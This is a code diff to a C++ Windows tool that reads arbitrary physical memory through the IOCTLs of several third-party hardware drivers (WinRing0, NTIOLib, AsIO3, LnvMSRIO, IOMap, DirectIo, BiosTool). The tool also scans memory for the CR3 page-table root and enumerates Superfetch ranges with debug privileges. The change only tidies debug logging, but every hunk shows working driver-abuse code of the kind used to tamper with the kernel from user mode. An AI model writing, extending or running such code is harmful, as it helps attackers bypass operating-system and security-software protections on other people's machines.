@@ -311,12 +311,9 @@ static PVOID BiosTool_Va2Pa(PVOID va) {
     DWORD ret = 0;
     if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_VA2PA,
         &req, sizeof(req), &req, sizeof(req), &ret, nullptr)) {
-        static bool dbg_va2pa = false;
-        if (!dbg_va2pa) {
+        if (g_verbose)
             printf("[dbg] BiosTool_Va2Pa IOCTL 0x%08X failed: err=%lu va=%p dev=0x%p\n",
                 BIOSTOOL_VA2PA, GetLastError(), va, (void*)g_biostoolDev);
-            dbg_va2pa = true;
-        }
         return nullptr;
     }
     return req.PA;
@@ -520,12 +517,9 @@ static QWORD Ktapi_FindCr3(QWORD checkVa) {
         QWORD fallback = 0;
         for (QWORD pa = 0; pa < limit; pa += 0x1000) {
             if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;
-            if (pa % 0x10000000ULL == 0) {
+            if (g_verbose && pa % 0x10000000ULL == 0)
                 printf("[*] CR3 scan pa=0x%llX limit=0x%llX idx=%d..%d\n",
                        pa, limit, idxLo, idxHi);
-                FILE* pf = fopen("C:\\bad\\cr3_scan.log", "a");
-                if (pf) { fprintf(pf, "pa=%llX limit=%llX idx=%d..%d\n", pa, limit, idxLo, idxHi); fclose(pf); }
-            }
             PVOID m = Ktapi_MapPhys((PVOID)pa, 0x1000);
             if (!m) continue;
             PUCHAR pml4 = (PUCHAR)m;
@@ -653,13 +647,13 @@ static std::vector<PF_PHYSICAL_MEMORY_RANGE_S> Superfetch_Ranges() {
     PF_MEMORY_RANGE_INFO_V1_S v1{};
     v1.Version = 1;
     NTSTATUS st1 = Superfetch_Query(17, &v1, sizeof(v1), &len);
-    printf("[dbg] Superfetch v1 probe st=0x%08X len=%lu\n", (unsigned)st1, len);
+    if (g_verbose) printf("[dbg] Superfetch v1 probe st=0x%08X len=%lu\n", (unsigned)st1, len);
     if (st1 == (NTSTATUS)0xC0000023 && len > sizeof(v1)) {
         std::vector<BYTE> buf(len, 0);
         auto* p = reinterpret_cast<PF_MEMORY_RANGE_INFO_V1_S*>(buf.data());
         p->Version = 1;
         NTSTATUS st2 = Superfetch_Query(17, p, len, nullptr);
-        printf("[dbg] Superfetch v1 full st=0x%08X rangeCount=%lu\n", (unsigned)st2, p->RangeCount);
+        if (g_verbose) printf("[dbg] Superfetch v1 full st=0x%08X rangeCount=%lu\n", (unsigned)st2, p->RangeCount);
         if (NT_SUCCESS(st2)) {
             for (ULONG i = 0; i < p->RangeCount; ++i)
                 out.push_back(p->Ranges[i]);
@@ -670,13 +664,13 @@ static std::vector<PF_PHYSICAL_MEMORY_RANGE_S> Superfetch_Ranges() {
     PF_MEMORY_RANGE_INFO_V2_S v2{};
     v2.Version = 2;
     NTSTATUS st3 = Superfetch_Query(17, &v2, sizeof(v2), &len);
-    printf("[dbg] Superfetch v2 probe st=0x%08X len=%lu\n", (unsigned)st3, len);
+    if (g_verbose) printf("[dbg] Superfetch v2 probe st=0x%08X len=%lu\n", (unsigned)st3, len);
     if (st3 == (NTSTATUS)0xC0000023 && len > sizeof(v2)) {
         std::vector<BYTE> buf(len, 0);
         auto* p = reinterpret_cast<PF_MEMORY_RANGE_INFO_V2_S*>(buf.data());
         p->Version = 2;
         NTSTATUS st4 = Superfetch_Query(17, p, len, nullptr);
-        printf("[dbg] Superfetch v2 full st=0x%08X rangeCount=%lu\n", (unsigned)st4, p->RangeCount);
+        if (g_verbose) printf("[dbg] Superfetch v2 full st=0x%08X rangeCount=%lu\n", (unsigned)st4, p->RangeCount);
         if (NT_SUCCESS(st4)) {
             for (ULONG i = 0; i < p->RangeCount; ++i)
                 out.push_back(p->Ranges[i]);
@@ -693,13 +687,6 @@ static void Superfetch_Init() {
     if (!EnablePrivilege("SeProfileSingleProcessPrivilege") || !EnablePrivilege("SeDebugPrivilege")) {
         printf("[!] Superfetch: SeProfileSingleProcess/SeDebug not enabled\n");
         return;
-    }
-
-    {
-        BYTE basic[64]{};
-        ULONG rl = 0;
-        NTSTATUS sb = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, basic, sizeof(basic), &rl);
-        printf("[dbg] NtQuerySystemInformation basic st=0x%08X rl=%lu\n", (unsigned)sb, rl);
     }
 
     auto ranges = Superfetch_Ranges();
@@ -860,14 +847,11 @@ static bool WinRing0_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
     *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
     *(DWORD*)(buf.data() + 8) = (DWORD)size;
     DWORD returned = 0;
-    static bool dbg_wr0 = false;
     if (!DeviceIoControl(g_wr0Dev, WR0_IOCTL_READ_MEM,
             buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
-        if (!dbg_wr0) {
+        if (g_verbose)
             printf("[dbg] WinRing0_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                 WR0_IOCTL_READ_MEM, GetLastError(), pa, size);
-            dbg_wr0 = true;
-        }
         return false;
     }
     if (returned < (DWORD)size) return false;
@@ -939,22 +923,16 @@ static bool NTIOLib_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
     *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
     *(DWORD*)(buf.data() + 8) = (DWORD)size;
     DWORD returned = 0;
-    static bool dbg_ntio = false;
     if (!DeviceIoControl(g_ntiodev, NTIO_IOCTL_READ_MEM,
             buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
-        if (!dbg_ntio) {
+        if (g_verbose)
             printf("[dbg] NTIOLib_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                 NTIO_IOCTL_READ_MEM, GetLastError(), pa, size);
-            dbg_ntio = true;
-        }
         return false;
     }
     if (returned < (DWORD)size) {
-        static bool dbg_ntio2 = false;
-        if (!dbg_ntio2) {
+        if (g_verbose)
             printf("[dbg] NTIOLib_ReadPhys returned %lu < needed %zu\n", returned, size);
-            dbg_ntio2 = true;
-        }
         return false;
     }
     memcpy(out, buf.data() + 12, size);
@@ -1026,12 +1004,14 @@ static bool AsIO3_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
         std::vector<BYTE> outBuf(outSz, 0);
         if (DeviceIoControl(g_asio3dev, ASIO3_IOCTL_READ_MEM,
                 inBuf.data(), inSz, outBuf.data(), outSz, &returned, nullptr)) {
-            printf("[dbg] AsIO3 succeeded with inSz=%lu returned=%lu\n", inSz, returned);
+            if (g_verbose)
+                printf("[dbg] AsIO3 succeeded with inSz=%lu returned=%lu\n", inSz, returned);
             memcpy(out, outBuf.data(), std::min((DWORD)size, returned));
             return returned > 0;
         }
-        DWORD err = GetLastError();
-        printf("[dbg] AsIO3_ReadPhys inSz=%lu err=%lu pa=%p sz=%zu\n", inSz, err, pa, size);
+        if (g_verbose)
+            printf("[dbg] AsIO3_ReadPhys inSz=%lu err=%lu pa=%p sz=%zu\n",
+                inSz, GetLastError(), pa, size);
     }
     return false;
 }
@@ -1093,22 +1073,16 @@ static bool LnvMSRIO_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
     *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
     *(DWORD*)(buf.data() + 8) = (DWORD)size;
     DWORD returned = 0;
-    static bool dbg_lnv = false;
     if (!DeviceIoControl(g_lnvdev, LNV_IOCTL_READ_MEM,
             buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
-        if (!dbg_lnv) {
+        if (g_verbose)
             printf("[dbg] LnvMSRIO_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                 LNV_IOCTL_READ_MEM, GetLastError(), pa, size);
-            dbg_lnv = true;
-        }
         return false;
     }
     if (returned < (DWORD)size) {
-        static bool dbg_lnv2 = false;
-        if (!dbg_lnv2) {
+        if (g_verbose)
             printf("[dbg] LnvMSRIO_ReadPhys returned %lu < needed %zu\n", returned, size);
-            dbg_lnv2 = true;
-        }
         return false;
     }
     memcpy(out, buf.data() + 12, size);
@@ -1173,22 +1147,16 @@ static bool IOMap_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
     *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
     *(DWORD*)(buf.data() + 8) = (DWORD)size;
     DWORD returned = 0;
-    static bool dbg_iomap = false;
     if (!DeviceIoControl(g_iomapdev, IOMAP_IOCTL_READ_MEM,
             buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
-        if (!dbg_iomap) {
+        if (g_verbose)
             printf("[dbg] IOMap_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                 IOMAP_IOCTL_READ_MEM, GetLastError(), pa, size);
-            dbg_iomap = true;
-        }
         return false;
     }
     if (returned < (DWORD)size) {
-        static bool dbg_iomap2 = false;
-        if (!dbg_iomap2) {
+        if (g_verbose)
             printf("[dbg] IOMap_ReadPhys returned %lu < needed %zu\n", returned, size);
-            dbg_iomap2 = true;
-        }
         return false;
     }
     memcpy(out, buf.data() + 12, size);
@@ -1504,21 +1472,15 @@ static QWORD DirectIo_MapPhysPage(QWORD page, bool write) {
     DWORD got = 0;
     if (!DeviceIoControl(g_directioDev, DIRECTIO_IOCTL_MAP,
             req, 0x3d, req, sizeof(req), &got, nullptr)) {
-        static bool dbg = false;
-        if (!dbg) {
+        if (g_verbose)
             printf("[dbg] DirectIo_MapPhysPage flag=%d page=0x%llX err=%lu\n",
                 write ? 1 : 0, page, GetLastError());
-            dbg = true;
-        }
         return 0;
     }
     if (*(DWORD*)(req + 0x00) != 0) {
-        static bool dbg = false;
-        if (!dbg) {
+        if (g_verbose)
             printf("[dbg] DirectIo_MapPhysPage status=0x%08X page=0x%llX flag=%d\n",
                 *(DWORD*)(req + 0x00), page, write ? 1 : 0);
-            dbg = true;
-        }
         return 0;
     }
     return *(QWORD*)(req + 0x24);
